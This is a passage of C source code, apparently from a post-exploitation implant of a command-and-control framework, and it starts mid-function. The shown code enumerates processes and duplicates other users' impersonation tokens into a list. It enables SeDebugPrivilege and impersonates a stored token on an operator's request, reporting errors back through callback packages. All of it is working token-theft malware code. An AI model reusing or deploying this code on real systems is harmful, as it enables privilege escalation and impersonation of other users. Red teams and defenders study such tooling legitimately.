                        if ( Instance.Win32.OpenThreadToken( NtCurrentThread(), TOKEN_QUERY, TRUE, &hObject2 ) )
                        {
                            TokenRevSelf();

                            if ( IsImpersonationToken( hObject2 ) )
                            {
                                // Reallocate space if necessary
                                if ( NumTokens >= ListSize )
                                {
                                    ListSize *= 2;
                                    TokenList = Instance.Win32.LocalReAlloc(
                                            TokenList,
                                            ListSize * sizeof( SavedToken ),
                                            LMEM_MOVEABLE
                                    );
                                    if ( ! TokenList )
                                        goto Cleanup;
                                }

                                if ( GetDomainUsernameFromToken( hObject, TokenList[ NumTokens ].username ) )
                                {
                                    TokenList[ NumTokens ].token = hObject;
                                    TokenList[ NumTokens ].dwProcessID = ( DWORD ) ( ULONG_PTR ) pProcessInfoEntry->UniqueProcessId;
                                    TokenList[ NumTokens ].localHandle = 0;
                                    ProcessUserToken( &TokenList[ NumTokens ], UniqTokens, &NumUniqTokens );
                                    NumTokens++;
                                }
                            }

                            SysNtClose( hObject2 ); hObject2 = NULL;
                        } else {
                            TokenRevSelf();
                        }
                    }
                    else
                    {
                        SysNtClose( hObject ); hObject = NULL;
                    }
                }

                SysNtClose( hProcess ); hProcess = NULL;
            }
        }
        pProcessInfoEntry = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfoEntry + (ULONG_PTR)pProcessInfoEntry->NextEntryOffset);
    }

    for ( DWORD j = 0; j < NumTokens; ++j ) {
        SysNtClose( TokenList[ j ].token ); TokenList[ j ].token = NULL;
    }

    Instance.Win32.LocalFree( TokenList ); TokenList = NULL;

    *pUniqTokens = UniqTokens;
    *pNumTokens = NumUniqTokens;
    ReturnValue = TRUE;

Cleanup:
    if ( TokenList ) {
        Instance.Win32.LocalFree( TokenList );
    }

    if ( ! ReturnValue && UniqTokens ) {
        Instance.Win32.LocalFree( UniqTokens );
    }

    if ( pProcessInfoList ) {
        Instance.Win32.LocalFree( pProcessInfoList );
    }

    return ReturnValue;
}

BOOL ImpersonateTokenFromVault(
    IN DWORD TokenID
) {
    PTOKEN_LIST_DATA TokenData = NULL;
    BOOL             Success   = FALSE;

    TokenData = TokenGet( TokenID );

    if ( ! TokenData ) {
        PUTS( "Token not found in vault." )
        PackageTransmitError( CALLBACK_ERROR_TOKEN, 0x1 );
        goto Cleanup;
    }

    if ( ! ImpersonateTokenInStore( TokenData ) )
        goto Cleanup;

    Success = TRUE;

Cleanup:
    return Success;
}

BOOL ImpersonateTokenInStore(
    IN PTOKEN_LIST_DATA TokenData
) {
    BOOL Success = FALSE;

    if ( ! TokenData ) {
        goto Cleanup;
    }

    /* if we are already impersonating the selected token, do nothing */
    if ( Instance.Tokens.Impersonate && TokenData->Handle == Instance.Tokens.Token->Handle ) {
        return TRUE;
    }

    if ( ! TokenSetPrivilege( SE_DEBUG_NAME, TRUE ) ) {
        PUTS( "Could not enable SE_DEBUG_NAME privilege." )
        goto Cleanup;
    }

    if ( ! TokenRevSelf() ) {
        PACKAGE_ERROR_WIN32
        goto Cleanup;
    }

    if ( Instance.Win32.ImpersonateLoggedOnUser( TokenData->Handle ) ) {
        Instance.Tokens.Impersonate = TRUE;
        Instance.Tokens.Token       = TokenData;

        PRINTF( "[+] Successfully impersonated: %ls\n", TokenData->DomainUser );
    } else {
        Instance.Tokens.Impersonate = FALSE;
        Instance.Tokens.Token       = NULL;

        PRINTF( "[!] Failed to impersonate token user: %ls\n", TokenData->DomainUser );

        PACKAGE_ERROR_WIN32

        if ( ! TokenRevSelf() ) {
            PACKAGE_ERROR_WIN32
        }

        goto Cleanup;
    }

    Success = TRUE;

Cleanup:
    return Success;
}
